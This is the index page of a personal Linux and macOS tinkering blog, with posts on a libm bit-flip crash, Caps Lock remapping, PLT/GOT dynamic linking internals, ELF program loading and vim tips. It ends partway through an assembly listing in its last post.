<!DOCTYPE html>
<html>
  <head>
	<meta name="generator" content="Hugo 0.30.2" />
    <meta charset="utf-8">

    <title>warrick.io</title>

    <link rel="stylesheet" href="//warrick.io/css/jane.css">
    <link rel="stylesheet" href="//warrick.io/css/syntax.css">
    <link rel="stylesheet" href="//warrick.io/css/font-awesome.css">


    <link href="//warrick.io/index.xml" rel="alternate" type="application/rss+xml" title="warrick.io" />
  </head>
  <body>
    
  <h1 class="brand">warrick.io</h1>

  <div class="links">
    <i class="fa-twitter-square"></i>
    <i class="fa-github-square"></i>
  </div>

  
    <article>
      <h2><a href="//warrick.io/posts/testing-awesome-config/">testing awesome config</a></h2>
      <time>Jun 10, 2015</time>
      <p>Test your awesome wm config in a nested X:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">Xephyr :1 -ac -br -noreset -screen 1152x720 <span class="p">&amp;</span>
<span class="nv">DISPLAY</span><span class="o">=</span>:1.0 awesome -c ~/.config/awesome/rc.lua</code></pre></div>
<p><a href="https://wiki.archlinux.org/index.php/Awesome">https://wiki.archlinux.org/index.php/Awesome</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/one-bad-byte/">one bad byte</a></h2>
      <time>Apr 19, 2015</time>
      <p>Last night both Firefox and Chrome began crashing at startup. After fighting
with it for almost an hour I gave up and kept working, resolving to fix them in the
morning.</p>

<p>Well, then Vim started crashing at startup too. Uh uh honey, no no no.</p>

<p>A tail of <code>dmesg</code> revealed the problem - <code>libm-2.19</code>:</p>
<div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">[10567.643135] traps: python[18389] general protection ip:7efe0933eea2 sp:7ffff5087f30 error:0 in libm-2.19.so[7efe0932a000+105000]

[10591.556424] traps: chromium-browse[18584] general protection ip:7f6aaed27ea2 sp:7ffc2a01cf30 error:0 in libm-2.19.so[7f6aaed13000+105000]

[10875.658269] traps: apt-check[18686] general protection ip:7fd1d03f4ea2 sp:7ffdc7554530 error:0 in libm-2.19.so[7fd1d03e0000+105000]</code></pre></div>
<p>I replaced <code>libm-2.19</code> with a version from another machine running the same distro
and version, and everything started working again.</p>

<p>But, having spent a lot of time raging and slapping down commands, I really wanted
to know what the hell happened to <code>libm</code>.</p>

<p>Introducing <a href="http://www.dettus.net/dhex/">dhex</a>, a hex editor with an awesome diff mode.</p>

<p><img src="/img/dhex.png" /></p>

<p>That is it. Somehow an <code>0xC1</code> became an <code>0xE1</code>. Yep, <code>0x1100 0001</code> became <code>0x1110 0001</code>.</p>

<p>One bad bit, one bad byte, one bad lib.</p>

<p><img src="/img/patching.png" /></p>

<p>Imagine the mayhem one bad bit in <code>libc</code> could cause.</p>

<p><strong>Update</strong></p>

<p>If you are curious what instructions the bit flip changed, here it is:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">diff &lt;<span class="o">(</span>objdump -D -M intel libm-2.19.so.working <span class="p">|</span> grep -E <span class="s1">&#39;^\s+14e..:&#39;</span><span class="o">)</span> <span class="se">\
</span><span class="se"></span>     &lt;<span class="o">(</span>objdump -D -M intel libm-2.19.so.broken <span class="p">|</span> grep -E <span class="s1">&#39;^\s+14e..:&#39;</span><span class="o">)</span>

<span class="m">40</span>,45c40,50
&lt;    14e9e:	c1 fa <span class="m">14</span>             	sar    edx,0x14
&lt;    14ea1:	<span class="m">81</span> e6 ff ff 0f <span class="m">00</span>    	and    esi,0xfffff
&lt;    14ea7:	<span class="m">81</span> fe 9d a0 <span class="m">06</span> <span class="m">00</span>    	cmp    esi,0x6a09d
&lt;    14ead:	0f 8f 4d <span class="m">04</span> <span class="m">00</span> <span class="m">00</span>    	jg     <span class="m">15300</span> &lt;__log10_finite+0x680&gt;
&lt;    14eb3:	<span class="m">89</span> d1                	mov    ecx,edx
&lt;    14eb5:	<span class="m">81</span> ce <span class="m">00</span> <span class="m">00</span> f0 3f    	or     esi,0x3ff00000
---
&gt;    14e9e:	e1 fa                	loope  14e9a &lt;__log10_finite+0x21a&gt;
&gt;    14ea0:	<span class="m">14</span> <span class="m">81</span>                	adc    al,0x81
&gt;    14ea2:	e6 ff                	out    0xff,al
&gt;    14ea4:	ff 0f                	dec    DWORD PTR <span class="o">[</span>rdi<span class="o">]</span>
&gt;    14ea6:	<span class="m">00</span> <span class="m">81</span> fe 9d a0 <span class="m">06</span>    	add    BYTE PTR <span class="o">[</span>rcx+0x6a09dfe<span class="o">]</span>,al
&gt;    14eac:	<span class="m">00</span> 0f                	add    BYTE PTR <span class="o">[</span>rdi<span class="o">]</span>,cl
&gt;    14eae:	8f                   	<span class="o">(</span>bad<span class="o">)</span>
&gt;    14eaf:	4d <span class="m">04</span> <span class="m">00</span>             	rex.WRB add al,0x0
&gt;    14eb2:	<span class="m">00</span> <span class="m">89</span> d1 <span class="m">81</span> ce <span class="m">00</span>    	add    BYTE PTR <span class="o">[</span>rcx+0xce81d1<span class="o">]</span>,cl
&gt;    14eb8:	<span class="m">00</span> f0                	add    al,dh
&gt;    14eba:	3f                   	<span class="o">(</span>bad<span class="o">)</span></code></pre></div>
<p>Looks like I need to <s>start backing up the disk, now</s> <s>replace the power supply</s> RAM.</p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/remap-capslock-linux/">remap capslock in linux</a></h2>
      <time>Apr 6, 2015</time>
      <p>Here is how I map <code>CAPSLOCK</code> + <code>H/J/K/L</code> to the arrow keys in Linux:</p>

<p>Remap the <code>CAPSLOCK</code> key with <code>xmodmap</code>:</p>
<div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">cat &gt;&gt; ~/.xmodmaprc <span class="s">&lt;&lt;EOF
</span><span class="s">clear Lock
</span><span class="s">keycode 66 = ISO_Level3_Shift
</span><span class="s">EOF</span></code></pre></div>
<p>Modify the <code>xkb</code> bindings:</p>
<div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">cp /usr/share/X11/xkb/symbols/us ~/xkb-symbols-us.backup

sudo sed -i -r <span class="s1">&#39;0,/h,\s+H/s//h, H, Left, Left/&#39;</span> /usr/share/X11/xkb/symbols/us 
sudo sed -i -r <span class="s1">&#39;0,/j,\s+J/s//j, J, Down, Down/&#39;</span> /usr/share/X11/xkb/symbols/us 
sudo sed -i -r <span class="s1">&#39;0,/k,\s+K/s//k, K, Up, Up/&#39;</span> /usr/share/X11/xkb/symbols/us 
sudo sed -i -r <span class="s1">&#39;0,/l,\s+L/s//l, L, Right, Right/&#39;</span> /usr/share/X11/xkb/symbols/us </code></pre></div>
<p>Clean the cache:</p>
<div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">sudo rm /var/lib/xkb/*.xkm</code></pre></div>
<p><a href="http://superuser.com/questions/96299/mapping-superhjkl-to-arrow-keys-under-x">http://superuser.com/questions/96299/mapping-superhjkl-to-arrow-keys-under-x</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/stay-on-home/">stay on home row</a></h2>
      <time>Jan 27, 2015</time>
      <p>I am sick of moving my hands to the mouse and arrow keys. This is my formula on Mac OS X for minimizing mouse usage while I&rsquo;m working:</p>

<p><strong>MacVim</strong> [<a href="https://code.google.com/p/macvim/">1</a>] &mdash; Modal editor or bust.</p>

<p><strong>Spectacle</strong> [<a href="http://spectacleapp.com/">2</a>] &mdash; moving windows with keyboard shortcuts.<br />
I prefer vim-like <code>Shift</code>+<code>Command</code>+<code>H/J/K/L</code> for moving windows about.</p>

<p><img src="/img/spectacle.png"></p>

<p><strong>Vimium</strong> [<a href="http://vimium.github.io/">3</a>] &mdash; Chromium extension for vim-like page navigation shortcuts.<br />
The easymotion-esque link navigation is just brilliant. You can &lsquo;click&rsquo; links, and complete complex forms without touching the mouse.</p>

<p><strong>Seil and Karabiner</strong> [<a href="https://pqrs.org/osx/karabiner/seil.html.en">4</a>,<a href="https://pqrs.org/osx/karabiner/index.html.en">5</a>] &mdash; Remap <code>CAPSLOCK</code> key and add custom keyboard shortcuts.<br />
The final piece that makes it all complete is remapping the otherwise entirely unused and very conveniently located <code>CAPSLOCK</code> key to something useful.</p>

<p>I couldn&rsquo;t get away from using the arrow keys at the command line to traverse the readline history or for selecting the correct URL in the browser autocomplete list.</p>

<p>So, I remapped the <code>CAPSLOCK</code> key to the right alt/option key, and configured a shortcut that maps <code>CAPSLOCK</code>+<code>H/J/K/L</code> to the arrow keys.</p>

<p><img src="/img/seil.png"></p>
<div class="highlight"><pre class="chroma"><code class="language-xml" data-lang="xml">  <span class="c">&lt;!-- ~/Library/Application Support/Karabiner/private.xml --&gt;</span>
  <span class="nt">&lt;item&gt;</span>
    <span class="nt">&lt;name&gt;</span>Capslock Vim Arrows<span class="nt">&lt;/name&gt;</span>
    <span class="nt">&lt;appendix&gt;</span>Use capslock+HJKL as arrow keys.<span class="nt">&lt;/appendix&gt;</span>
    <span class="nt">&lt;identifier&gt;</span>private.capslock_vim_arrows<span class="nt">&lt;/identifier&gt;</span>
    <span class="nt">&lt;autogen&gt;</span>
      __KeyToKey__ KeyCode::H, ModifierFlag::OPTION_R, KeyCode::CURSOR_LEFT
    <span class="nt">&lt;/autogen&gt;</span>
    <span class="nt">&lt;autogen&gt;</span>
      __KeyToKey__ KeyCode::J, ModifierFlag::OPTION_R, KeyCode::CURSOR_DOWN
    <span class="nt">&lt;/autogen&gt;</span>
    <span class="nt">&lt;autogen&gt;</span>
      __KeyToKey__ KeyCode::K, ModifierFlag::OPTION_R, KeyCode::CURSOR_UP
    <span class="nt">&lt;/autogen&gt;</span>
    <span class="nt">&lt;autogen&gt;</span>
      __KeyToKey__ KeyCode::L, ModifierFlag::OPTION_R, KeyCode::CURSOR_RIGHT
    <span class="nt">&lt;/autogen&gt;</span>
  <span class="nt">&lt;/item&gt;</span>  </code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/dynamic-linking-continued/">dynamic linking continued</a></h2>
      <time>Dec 16, 2014</time>
      

<p>In the last post, I showed how an unlinked library function invokes <code>ld</code>. In
this post, I will show what happens in <code>ld</code>.</p>

<p>I talk about how <code>eglibc</code> does runtime linking in the current Ubuntu 14.04.1.
However, it seems the two libraries <code>glibc</code> and <code>eglibc</code> have reconciled their
past differences and <code>eglibc</code> has been discontinued. So, likely, Ubuntu will
use <code>glibc</code> again in 15.</p>

<p>In any event, the two should be next to identical.</p>

<p>Find the sources for <code>/lib/ld-linux.so.2</code> in the <code>eglibc</code> package inside the
<code>elf</code> directory.</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ apt-get <span class="nb">source</span> eglibc</code></pre></div>
<h3 id="dl-fixup">_dl_fixup</h3>

<p>So, we left off in the last post with the binary jumping in the PLT to
<code>_dl_fixup</code>,</p>
<div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm">  <span class="na">...</span>
 <span class="err">80482</span><span class="nl">f6:</span>  <span class="nf">push</span>   <span class="mi">0x0</span>                      <span class="c">; push index of puts in GOT
</span><span class="c"></span>  <span class="no">...</span>
 <span class="err">80482</span><span class="nl">e0:</span>  <span class="nf">push</span>   <span class="no">DWORD</span> <span class="no">PTR</span> <span class="no">ds</span><span class="p">:</span><span class="mi">0x804a004</span>   <span class="c">; push address of link_map
</span><span class="c"></span> <span class="mi">80482</span><span class="no">e6</span><span class="p">:</span>  <span class="no">jmp</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="no">ds</span><span class="p">:</span><span class="mi">0x804a008</span>   <span class="err">;</span> <span class="no">jump</span> <span class="no">to</span> <span class="no">_dl_fixup</span><span class="p">()</span> <span class="no">in</span> <span class="no">ld</span></code></pre></div>
<p>which is located in <code>dl-runtime.c</code>:</p>
<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="c1">// dl-runtime.c 
</span><span class="c1"></span><span class="n">_dl_fixup</span> <span class="p">(</span><span class="k">struct</span> <span class="n">link_map</span> <span class="o">*</span><span class="n">l</span><span class="p">,</span> <span class="n">ElfW</span><span class="p">(</span><span class="n">Word</span><span class="p">)</span> <span class="n">reloc_arg</span><span class="p">)</span>
<span class="p">{</span> 

  <span class="c1">// ...
</span><span class="c1"></span>  <span class="n">result</span> <span class="o">=</span> <span class="n">_dl_lookup_symbol_x</span> <span class="p">(</span><span class="n">strtab</span> <span class="o">+</span> <span class="n">sym</span><span class="o">-&gt;</span><span class="n">st_name</span><span class="p">,</span> <span class="n">l</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sym</span><span class="p">,</span> <span class="n">l</span><span class="o">-&gt;</span><span class="n">l_scope</span><span class="p">,</span>
				    <span class="n">version</span><span class="p">,</span> <span class="n">ELF_RTYPE_CLASS_PLT</span><span class="p">,</span> <span class="n">flags</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="p">}</span></code></pre></div>
<p>Notice the function takes two arguments.</p>

<p>The address pushed at <code>0x80482e0</code> is an address to a <code>link_map</code> structure and
the <code>reloc_arg</code> argument is the index pushed for <code>puts</code> at <code>0x80482e0</code>.</p>

<p>In our example, <code>puts</code> is the only function and is thus at index <code>0x0</code>.</p>

<p>Without going into much detail, a <code>link_map</code> struct is maintained by <code>ld</code> for
all objects, the binary and linked libraries, and contains the important
addresses and state for linking.</p>

<p>You could consider the <code>link_map</code> the linker&rsquo;s internal representation of an
ELF.</p>

<h3 id="dl-lookup-symbol-x">_dl_lookup_symbol_x</h3>

<p>Ultimately, <code>_dl_fixup</code> calls the <code>_dl_lookup_symbol_x</code> function which uses
<code>reloc_arg</code> (<code>0x0</code> in our example) as index into the <code>.rel.plt</code> section:</p>
<div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">Relocation section &#39;.rel.plt&#39; at offset 0x298 contains 3 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  00000107 R_386_JUMP_SLOT   00000000   puts
0804a010  00000207 R_386_JUMP_SLOT   00000000   __gmon_start__
0804a014  00000307 R_386_JUMP_SLOT   00000000   __libc_start_main</code></pre></div>
<p>From the <code>.rel.plt</code>, <code>_dl_lookup_symbol_x</code> uses the Info field as an index
into the <code>.symtab</code> section:</p>
<div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">Symbol table &#39;.symtab&#39; contains 67 entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
    52: 00000000     0 FUNC    GLOBAL DEFAULT  UND puts@@GLIBC_2.0</code></pre></div>
<p>Finally, <code>_dl_lookup_symbol_x</code> uses the Name field, <code>puts@GLIBC_2.0</code>, to
perform a scoped lookup of the function on other objects.</p>

<p>What is really interesting is how it actually searches other objects. It would
be very inefficient to perform a linear search of all other objects <code>.dynsym</code>
tables.</p>

<p>Actually, <code>ld</code> uses the <code>.hash</code> and <code>.gnu.hash</code> sections, which store hashes of
the symbol names.</p>

<p>There are two implementations the SYSV hash and the newer GNU method.</p>

<p>GNU hashing uses a bucketed bloom filter, you may have noticed in the readelf
output:</p>
<div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">readelf -a /lib/i386-linux-gnu/libc.so.6

Histogram for `.gnu.hash&#39; bucket list length (total of 1011 buckets):
 Length  Number     % of total  Coverage
      0  100        (  9.9%)
      1  219        ( 21.7%)      9.2%
      2  260        ( 25.7%)     31.0%
      3  211        ( 20.9%)     57.6%
      4  133        ( 13.2%)     80.0%
      5  59         (  5.8%)     92.4%
      6  22         (  2.2%)     97.9%
      7  6          (  0.6%)     99.7%
      8  1          (  0.1%)    100.0%</code></pre></div>
<p>Find out more in this article:
<a href="https://blogs.oracle.com/ali/entry/gnu_hash_elf_sections">https://blogs.oracle.com/ali/entry/gnu_hash_elf_sections</a>.</p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/dynamic-linking/">dynamic linking</a></h2>
      <time>Dec 15, 2014</time>
      <p>Deciphering the indirection of runtime dynamic linking can be a bit tricky.</p>

<p>I always seem to forget how the PLT and GOT interact.</p>

<p>Consider this simple example of calling the <code>puts</code> function in the dynamically
linked <code>libc</code>:</p>
<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
	<span class="n">puts</span><span class="p">(</span><span class="sa"></span><span class="s">&#34;foo bar baz qux&#34;</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></div><div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ gcc test.c -o <span class="nb">test</span> 

<span class="c1"># Show the dynamically linked libraries for the test binary.
</span><span class="c1"></span>$ ldd <span class="nb">test</span> 
	linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0xb77d4000<span class="o">)</span>
	libc.so.6 <span class="o">=</span>&gt; /lib/i386-linux-gnu/libc.so.6 <span class="o">(</span>0xb7615000<span class="o">)</span>
	/lib/ld-linux.so.2 <span class="o">(</span>0xb77d5000<span class="o">)</span></code></pre></div>
<p>Disassembling <code>test</code>, you&rsquo;ll find a call to <code>puts</code>, which is located in the
dynamically linked library <code>libc.so.6</code>:</p>
<div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm"><span class="err">0804842</span><span class="nl">d:</span>  <span class="nf">call</span>   <span class="mh">80482f0</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span></code></pre></div>
<p>So, the PLT (procedure linkage table) is responsible for jumping to the <code>puts</code>
function if the dynamic linker <code>ld-linux.so.2</code> has already found the function
in libc, or otherwise jumping to <code>ld</code> to find and link the function:</p>
<div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm"><span class="err">080482</span><span class="nf">f0</span> <span class="err">&lt;</span><span class="no">puts@plt</span><span class="err">&gt;</span><span class="p">:</span>
 <span class="err">80482</span><span class="nl">f0:</span>   <span class="nf">jmp</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="no">ds</span><span class="p">:</span><span class="mi">0x804a00c</span>  <span class="c">; jump to address in 0x804a00c
</span><span class="c"></span> <span class="mi">80482</span><span class="no">f6</span><span class="p">:</span>   <span class="no">push</span>   <span class="mi">0x0</span>                     <span class="c">; push index of puts in GOT
</span><span class="c"></span> <span class="mi">80482</span><span class="no">fb</span><span class="p">:</span>   <span class="no">jmp</span>    <span class="mh">80482e0</span> <span class="p">&lt;</span><span class="no">_init</span><span class="p">+</span><span class="mi">0x30</span><span class="p">&gt;</span>    <span class="err">;</span> <span class="no">jump</span> <span class="no">to</span> <span class="no">ld</span> <span class="no">trampoline</span></code></pre></div>
<p>First, notice that the jump at <code>0x8048df0</code> is actually a jump to a <code>PTR</code>, which
means it does not jump to the address <code>0x804a00c</code> but rather the address stored
at that address:</p>

<pre><code>(gdb) info file
0x0804a000 - 0x0804a018 is .got.plt

(gdb) x/wx 0x804a00c
0x804a00c &lt;puts@got.plt&gt;:	0x080482f6
</code></pre>

<p>So, we can see that the address <code>0x804a00c</code> is actually in the <code>.got.plt</code>
section, and is where the address of <code>puts</code> will be stored when <code>ld</code> links the
function.</p>

<p>However, it is initialized to the value <code>0x080482f6</code>, which is actually the
address of <code>push 0x0</code>, directly below the jump.</p>

<p>After pushing the value <code>0x0</code> to the stack, we jump again to the code that will
actually take us into <code>ld</code> to perform the runtime lookup and linking:</p>
<div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm"><span class="err">080482</span><span class="nf">e0</span> <span class="err">&lt;</span><span class="no">puts@plt-0x10</span><span class="err">&gt;</span><span class="p">:</span>
 <span class="err">80482</span><span class="nl">e0:</span>  <span class="nf">push</span>   <span class="no">DWORD</span> <span class="no">PTR</span> <span class="no">ds</span><span class="p">:</span><span class="mi">0x804a004</span>   <span class="c">; push address of link_map
</span><span class="c"></span> <span class="mi">80482</span><span class="no">e6</span><span class="p">:</span>  <span class="no">jmp</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="no">ds</span><span class="p">:</span><span class="mi">0x804a008</span>   <span class="c">; jump to _dl_fixup() in ld
</span><span class="c"></span> <span class="mi">80482</span><span class="no">ec</span><span class="p">:</span>  <span class="no">add</span>    <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">eax</span><span class="p">],</span><span class="no">al</span></code></pre></div>
<p>Inspecting the two addresses, which you should note are stored immediately
before the <code>puts</code> address in the <code>.got.plt</code>, we see that both addresses are in
pages mapped to <code>ld</code>:</p>

<pre><code>(gdb) x/wx 0x804a004
0x804a004:	0xb7fff938

0xb7fff000 0xb8000000 rw-p	/lib/i386-linux-gnu/ld-2.19.so

(gdb) x/wx 0x804a008
0x804a008:	0xb7ff24f0

0xb7fde000 0xb7ffe000 r-xp	/lib/i386-linux-gnu/ld-2.19.so
</code></pre>

<p>So, you can see the first address is in writable space and the second
executable. In the next post, I&rsquo;ll discuss what happens in <code>ld</code>.</p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/current-directory-hell/">current directory hell</a></h2>
      <time>Dec 9, 2014</time>
      <p>One of the most frustrating and frequent scripting errors I make is in
mistaking my current directory and improperly referencing another file or
directory.</p>

<p>I have adopted a scope-like block style for changing directories using
<code>pushd</code> and <code>popd</code>:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
</span><span class="cp"></span>
mkdir lib/gdb
<span class="nb">pushd</span> lib/gdb
  sudo apt-get build-dep -y gdb
  sudo apt-get install -y libpython2.7 libpython2.7-dev

  apt-get <span class="nb">source</span> gdb

  <span class="nb">pushd</span> gdb-?.?.?
    ./configure <span class="se">\
</span><span class="se"></span>      --with-python<span class="o">=</span><span class="nv">$VIRTUAL_ENV</span>/bin/python <span class="se">\
</span><span class="se"></span>      --prefix<span class="o">=</span><span class="nv">$VIRTUAL_ENV</span>
    make
    make install
  <span class="nb">popd</span>
popd</code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/highlight-column-vim/">highlight column in vim</a></h2>
      <time>Oct 25, 2014</time>
      <div class="highlight"><pre class="chroma"><code class="language-vim" data-lang="vim"><span class="p">:</span><span class="nx">set</span> <span class="nx">cc</span><span class="p">=</span><span class="m">80</span><span class="err">
</span><span class="err">
</span><span class="err"></span><span class="p">:</span><span class="nx">help</span> <span class="s1">&#39;colorcolumn&#39;</span></code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/linux-program-execution/">linux program execution</a></h2>
      <time>Oct 22, 2014</time>
      

<h3 id="how-does-linux-load-a-program-for-execution">How does Linux load a program for execution?</h3>

<p><strong>Overview</strong></p>

<p>Loading an ELF executable into memory is handled by the <code>load_elf_binary</code>
function in <code>fs/binfmt_elf.c</code>.</p>

<p><code>load_elf_binary</code> performs consistency checks, allocates memory, and loads each
segment into memory before calling the dynamic linker or starting execution of
the program.</p>

<table style="text-align:center; font-size: 16px;">
<col style="background-color: #eee;" />
<thead>
  <tr style="border-bottom: 2px solid #CCC;">
    <th style="background: #FFF;"></th>
    <th>Function</th>
    <th>Kernel File</th>
    <th>Annotation</th>
  </tr>
</thead>
<tbody>
  <tr>
    <td>1</td>
    <td><i>shell</i></td>
    <td></td>
    <td>Enter a command.</td>
  </td>
  <tr>
    <td>2</td>
    <td>execve()</td>
    <td></td>
    <td>Shell calls libc function.</td>
  </tr>
  <tr>
    <td>3</td>
    <td>execve()</td>
    <td></td>
    <td>Libc does system call.</td>
  </tr>
  <tr>
    <td>4</td>
    <td><i>int 0x80</i></td>
    <td>arch/x86/kernel/entry_32.c</td>
    <td>Kernel takes control.<td> 
  </tr>
  <tr>
    <td>5</td>
    <td>do_execve()</td>
    <td>fs/exec.c</td>
    <td>Kernel opens executable file.</td>
  </tr>
  <tr>
    <td>6</td>
    <td>search_binary_handler()</td>
    <td>fs/exec.c</td>
    <td>Detect type of binary.</td>
  </tr>
  <tr style="background-color: #dad295;">
    <td>7</td>
    <td>load_elf_binary()</td>
    <td>fs/binfmt_elf.c</td>
    <td>Load ELF and libraries.</td>
  </tr>
  <tr>
    <td>8</td>
    <td>start_thread()</td>
    <td>arch/x86/kernel/process_32.c</td>
    <td>Execute program code.</td>
  </tr>
</tbody>
</table>

<p><strong>Notes</strong></p>

<p>This table is based off the table from this <a href="http://asm.sourceforge.net/articles/startup.htm">article</a> for Linux 2.2.x
kernels.</p>

<p>Since 2.6, the <code>arch/i386</code> and <code>arch/x86_64</code> hierarchies were merged into a
<a href="http://lwn.net/Articles/242439/">unified</a> <code>arch/x86</code> architecture.</p>

<p>System calls are now defined with the <code>SYSCALL_DEFINE</code> macros, and what was
once <code>sys_execve</code> is defined in <code>fs/exec.c</code> rather than <code>arch/i386/process.c</code>.</p>

<p><a href="http://www.sco.com/developers/gabi/latest/contents.html">http://www.sco.com/developers/gabi/latest/contents.html</a><br />
<a href="http://www.skyfree.org/linux/references/ELF_Format.pdf)">http://www.skyfree.org/linux/references/ELF_Format.pdf)</a><br />
<a href="http://s.eresi-project.org/inc/articles/elf-rtld.txt">http://s.eresi-project.org/inc/articles/elf-rtld.txt</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/enforce-better-typing-habits/">enforcing better typing habits</a></h2>
      <time>Oct 21, 2014</time>
      

<h3 id="bad-typing-habits">Bad Typing Habits</h3>

<p>Touch typing rules state that the shift key is always pressed by the pinky
finger opposite the finger pressing the other key.</p>

<p>Unfortunately, I have the bad habit of using the right shift for semicolons,
double quotes, curly braces, and question marks, which requires lifting my
right hand.</p>

<p>As I become dependent on VIM for everyday coding, I also become increasingly
aware of any keystrokes that drag my hands away from the home row.</p>

<p>Also, long hours of coding can leave my wrist feeling tight.</p>

<p>So, in an effort to minimize stress to my wrist and speed up coding, I wanted
to compel myself to use the correct shift key.</p>

<h3 id="introducing-karabiner">Introducing Karabiner</h3>

<p>Karabiner (previously KeyRemap4MacBook), is a keyboard customizer for OS X.</p>

<p><img src="/img/karabiner.png"/></p>

<p><a href="https://pqrs.org/osx/karabiner/">Karabiner</a> comes with a lot of useful predefined bindings, but you can also
specify your own private bindings in <code>~/Library/Application
Support/Karabiner/private.xml</code>.</p>

<p>Below is an entry from my configuration for enforcing proper shifting:</p>
<div class="highlight"><pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
<span class="nt">&lt;root&gt;</span>
  <span class="nt">&lt;item&gt;</span>
    <span class="nt">&lt;name&gt;</span>Compel Semicolon<span class="nt">&lt;/name&gt;</span>
    <span class="nt">&lt;appendix&gt;</span>Disable right shift for colon.<span class="nt">&lt;/appendix&gt;</span>
    <span class="nt">&lt;identifier&gt;</span>private.compel_colon<span class="nt">&lt;/identifier&gt;</span>
    <span class="nt">&lt;autogen&gt;</span>
      __KeyToKey__ 
      KeyCode::SEMICOLON, ModifierFlag::SHIFT_R | ModifierFlag::NONE,
      KeyCode::VK_NONE
    <span class="nt">&lt;/autogen&gt;</span>
  <span class="nt">&lt;/item&gt;</span>
  <span class="c">&lt;!-- ... --&gt;</span>
<span class="nt">&lt;/root&gt;</span></code></pre></div>
<p>My complete configuration can be found in this <a href="https://gist.github.com/kwarrick/fa96ac725182518798ba">gist</a>.</p>

<p><strong>WARNING:</strong> Forgetting you disabled the key combination can be quite
infuriating, and after retyping the same character repeatedly without effect,
you may want to throw things.</p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/select-pasted-vim/">selected pasted text in vim</a></h2>
      <time>Oct 21, 2014</time>
      <p>Select the previously pasted text</p>
<div class="highlight"><pre class="chroma"><code class="language-vim" data-lang="vim"><span class="nx">nnoremap</span> <span class="nx">gp</span> `[<span class="nx">v</span>`]</code></pre></div>
<p><a href="http://vim.wikia.com/wiki/Selecting_your_pasted_text">http://vim.wikia.com/wiki/Selecting_your_pasted_text</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/start-to-main/">_start to main</a></h2>
      <time>Oct 20, 2014</time>
      <p>Compiled with <code>libc</code>, a program&rsquo;s <code>_start</code> procedure will simply call
<code>__libc_start_main</code>:</p>
<div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nl">_start:</span>
  <span class="nf">xor</span>   <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>               <span class="c">; zero ebp as recommended by ABI spec
</span><span class="c"></span>  <span class="no">pop</span>   <span class="no">esi</span>                    <span class="c">; pop argc into esi
</span><span class="c"></span>  <span class="no">mov</span>   <span class="no">ecx</span><span class="p">,</span> <span class="no">esp</span>               <span class="c">; move **argv to ecx, without altering stack
</span><span class="c"></span>  <span class="no">and</span>   <span class="no">esp</span><span class="p">,</span> <span class="mi">0</span><span class="no">FFFFFFF0h</span>        <span class="c">; mask clears bottom 4 bits, 16 byte align
</span><span class="c"></span>  <span class="no">push</span>  <span class="no">eax</span>                    <span class="c">; setup args for __libc_start_main [1]
</span><span class="c"></span>  <span class="no">push</span>  <span class="no">esp</span>                    <span class="c">; push *stack_end
</span><span class="c"></span>  <span class="no">push</span>  <span class="no">edx</span>                    <span class="c">; push *rtld_fini, linker destructor
</span><span class="c"></span>  <span class="no">push</span>  <span class="no">offset</span> <span class="no">__libc_csu_fini</span> <span class="c">; push *fini, finalizer function pointer
</span><span class="c"></span>  <span class="no">push</span>  <span class="no">offset</span> <span class="no">__libc_csu_init</span> <span class="c">; push *init, initializer function pointer
</span><span class="c"></span>  <span class="no">push</span>  <span class="no">ecx</span>                    <span class="c">; push **ubp_av, argv from stack
</span><span class="c"></span>  <span class="no">push</span>  <span class="no">esi</span>                    <span class="c">; push argc, argc from stack
